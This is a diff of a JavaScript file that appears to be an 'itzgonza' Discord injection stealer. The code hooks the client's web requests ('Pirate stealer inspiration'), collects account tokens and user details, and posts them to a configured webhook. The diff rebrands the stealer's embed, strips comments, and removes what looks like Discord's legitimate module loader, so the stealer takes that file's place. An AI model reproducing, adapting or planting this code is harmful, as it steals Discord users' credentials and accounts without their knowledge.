@@ -7,9 +7,6 @@ const https = require('https');
 const querystring = require("querystring");
 const fs = require("fs");
 
-
-// Initialization
-
 var config = {
     brand: "itzgonza",
 
@@ -20,16 +17,16 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [false, ""],
+    ping: [false, "@here"],
 
     embed: {
-        username: "github.com/itzgonza",
+        username: "itzgonza",
         footer: {
-            text: `github.com/itzgonza`,
-            icon_url: "https://cdn.discordapp.com/attachments/889693509697830922/1078772360351596757/IMG_5991.JPG",
+            text: `itzgonza`,
+            icon_url: "https://cdn.discordapp.com/avatars/856704102016614460/fcea9c001343bc4d49dc78194bdd25a3.png?size=2048",
         },
         href: "https://github.com/itzgonza",
-        avatar_url: "https://cdn.discordapp.com/attachments/889693509697830922/1078772360351596757/IMG_5991.JPG"
+        avatar_url: "https://avatars.githubusercontent.com/u/61884903?v=4"
     },
 
     badges: {
@@ -148,8 +145,6 @@ class Event {
     }
 }
 
-// Traffic recording (Pirate stealer inspiration)
-
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     try {
         if (details.url.startsWith(config.webhook)) {
@@ -246,8 +241,6 @@ session.defaultSession.webRequest.onCompleted(config.filters["user"], async (det
 
     } catch {}
 })
-
-// ==================================================================================
 
 var event_handlers = {
 
@@ -549,13 +542,9 @@ var event_handlers = {
     },
 }
 
-// ==================================================================================
-
 function getDiscordClient() {
     return `${process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0].split(7)}`
 }
-
-// ==================================================================================
 
 function getNitro(flags) {
     switch (flags) {
@@ -644,8 +633,6 @@ async function getRelationships(token) {
     }
 }
 
-// ==================================================================================
-
 function sendToWebhook(params) {
 
     if (config.ping[0] == true) {
@@ -676,8 +663,6 @@ function sendToWebhook(params) {
     req.end();
 }
 
-// ==================================================================================
-
 function createEmbed(data) {
     let obj = {
         "footer": config.embed.footer,
@@ -690,8 +675,6 @@ function createEmbed(data) {
 
     return obj;
 }
-
-// ==================================================================================
 
 async function initialize() {
 
@@ -853,27 +836,4 @@ async function initialize() {
     }
 }
 
-const hook = require('./discord_hook.node');
-const fs = require('fs');
-const path = require('path');
-
-let dataDirectory;
-
-try {
-  dataDirectory = window.DiscordNative.fileManager.getModuleDataPathSync
-    ? path.join(window.DiscordNative.fileManager.getModuleDataPathSync(), 'discord_hook')
-    : null;
-} catch (e) {
-  console.error('Failed to get data directory: ', e);
-}
-
-if (dataDirectory != null) {
-  try {
-    fs.mkdirSync(dataDirectory, {recursive: true});
-  } catch (e) {
-    console.warn("Couldn't create hook data directory ", dataDirectory, ':', e);
-  }
-}
-
-hook.initialize({dataDirectory});
-module.exports = hook;
+module.exports = require("./core.asar");
